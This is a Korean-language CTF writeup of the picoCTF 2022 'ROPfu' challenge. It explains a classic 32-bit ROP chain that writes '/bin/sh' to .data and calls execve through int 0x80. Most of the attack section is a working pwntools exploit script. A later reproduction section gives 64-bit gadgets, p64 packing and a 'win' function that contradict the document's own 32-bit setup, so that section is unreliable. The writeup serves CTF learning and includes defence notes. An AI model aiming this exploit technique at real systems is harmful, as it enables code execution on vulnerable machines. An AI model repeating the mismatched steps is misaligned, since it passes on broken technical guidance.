---
title: ROPfu — picoCTF 2022 pwn writeup
created: 2026-06-15
updated: 2026-06-16
type: query
tags: [ctf, pwn, rop, nx, execve, int-0x80, picoctf]
sources: [https://picoctf2022.haydenhousen.com/binary-exploitation/ropfu, https://cryptocat.me/blog/ctf/2022/pico/pwn/ropfu/]
confidence: high
---

# ROPfu — picoCTF 2022 pwn writeup

> `ROPfu`는 **NX가 켜진 32-bit 바이너리에서 ROP 가젯으로 `/bin/sh` 문자열을 `.data`에 쓰고, `int 0x80`으로 `execve`를 호출하는 picoCTF 2022 Binary Exploitation 문제**입니다. 핵심은 **classic ROP chain 구성**입니다.

## 1. 핵심 요약

- 스택에 shellcode를 두고 실행하는 방식은 NX 때문에 불가능합니다.
- 대신 ROP 가젯으로 레지스터를 조립하고 메모리에 문자열을 씁니다.
- `/bin/sh`를 `.data` 섹션에 기록한 뒤 `execve` 시스템 콜을 호출합니다.
- x86(32-bit) 환경이므로 `int 0x80` syscall 경로를 사용합니다.

## 2. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2022 |
| 분류 | pwn / binary exploitation |
| 핵심 요소 | ROP, NX bypass, memory write gadget, syscall |
| 아키텍처 | 32-bit x86 |
| 목표 | `/bin/sh` 실행 |

## 3. 공격 흐름

1. `checksec`로 NX가 활성화된 것을 확인합니다.
2. 오버플로 오프셋을 찾습니다.
3. `ROPgadget`으로 `pop` / `mov` / `int 0x80` 가젯을 찾습니다.
4. `.data` 섹션 주소를 확보합니다.
5. ROP chain으로 `/bin`과 `/sh\x00`를 순서대로 씁니다.
6. `eax=0xb`, `ebx=.data`, `ecx=0`, `edx=0`을 맞춥니다.
7. `int 0x80`으로 `execve("/bin/sh", NULL, NULL)`를 호출합니다.

## 4. ROP chain 개요

```text
overflow -> control EIP -> write '/bin' to .data -> write '/sh\x00' to .data+4 -> set registers -> int 0x80 -> shell
```

## 5. 익스플로잇 예시

```python
from pwn import *  # pwntools를 불러옵니다.

elf = context.binary = ELF('./vuln')  # 로컬 바이너리를 로드합니다.
io = process(elf.path)               # 로컬에서 실행합니다.

offset = 28  # saved EIP까지의 오프셋입니다.
rop = ROP(elf)  # 가젯을 찾고 ROP 체인을 조립합니다.

data_addr = elf.symbols['data_start']  # .data 섹션 시작 주소입니다.

# 아래 값들은 예시이며, 실제 바이너리에서 ROPgadget으로 확인합니다.
pop_eax = 0x080b074a          # pop eax; ret
pop_edx_ebx = 0x080583c9      # pop edx; pop ebx; ret
mov_eax_edx = 0x0809e5d8      # mov dword ptr [eax], edx; ret
pop_ebx = 0x08049022          # pop ebx; ret
pop_ecx = 0x08049e39          # pop ecx; ret
int_0x80 = 0x08071650         # int 0x80; ret

rop.raw([
    pop_eax, data_addr,               # EAX = .data
    pop_edx_ebx, b'/bin', b'junk',     # EDX = "/bin"
    mov_eax_edx,                       # [.data] = "/bin"
    pop_eax, data_addr + 4,            # EAX = .data + 4
    pop_edx_ebx, b'/sh\x00', b'junk',  # EDX = "/sh\x00"
    mov_eax_edx,                       # [.data+4] = "/sh\x00"
    pop_edx_ebx, 0, data_addr,         # EDX = 0, EBX = .data
    pop_ecx, 0,                        # ECX = 0
    pop_eax, 0xb,                      # EAX = 11 (execve)
    int_0x80                           # syscall
])

payload = flat({
    offset: rop.chain(),  # EIP를 ROP chain 시작으로 덮습니다.
})

io.sendlineafter(b'!', payload)  # 취약 입력에 payload를 보냅니다.
io.interactive()                 # 쉘 획득 후 상호작용합니다.
```

## 6. 왜 가능한가

- NX가 있어도 ROP는 기존 코드 조각만 사용하므로 실행 제한을 우회할 수 있습니다.
- `.data`는 writable이므로 `/bin/sh` 문자열을 두기에 적합합니다.
- 32-bit syscall 인터페이스는 `int 0x80`로 간단하게 호출할 수 있습니다.


## 재현 절차

1. ROP에 사용할 가젯과 심볼을 찾습니다.
```bash
# 사용할 gadget과 심볼을 먼저 찾습니다.
ROPgadget --binary ./vuln | grep "pop rdi"  # 예상: pop rdi; ret 같은 가젯이 출력됩니다.
nm -n ./vuln | grep win                      # 예상: win 함수 주소가 출력됩니다.
```
2. execve로 이어지는 ROP chain을 구성합니다.
```python
# pwntools로 ROP chain을 구성하는 흐름입니다.
from pwn import *
rop = b"A" * 72           # 예시 오프셋입니다.
rop += p64(0x40123b)      # 예시: pop rdi; ret 가젯입니다.
rop += p64(0x404050)      # 예시: "/bin/sh" 또는 문자열 주소입니다.
print(rop)
```
3. 체인을 실행해 flag 또는 쉘 획득 여부를 확인합니다.
## 7. 방어 관점 메모

- NX만으로는 부족하고, ASLR/PIE/Canary/CFI가 함께 필요합니다.
- 가젯을 조합하기 쉬운 바이너리는 공격 표면이 넓습니다.
- 입력 길이 제한과 포맷 검증이 우선입니다.

## 8. 비교 포인트

- `Handoff`는 **ret2reg + shellcode 실행형**입니다.
- `Function Overwrite`는 **function pointer hijack형**입니다.
- `ROPfu`는 **classic ROP syscall형**입니다.
- `PIE TIME`은 **PIE/ASLR 오프셋 계산형**입니다.

## 9. 참고 자료

- [Hayden Housen — ropfu | PicoCTF-2022 Writeup](https://picoctf2022.haydenhousen.com/binary-exploitation/ropfu)
- [CryptoCat — PicoCTF 2022: ROPfu](https://cryptocat.me/blog/ctf/2022/pico/pwn/ropfu/)
- [[rop-chain-execve-ctf-patterns]]
- [[exploitation]]
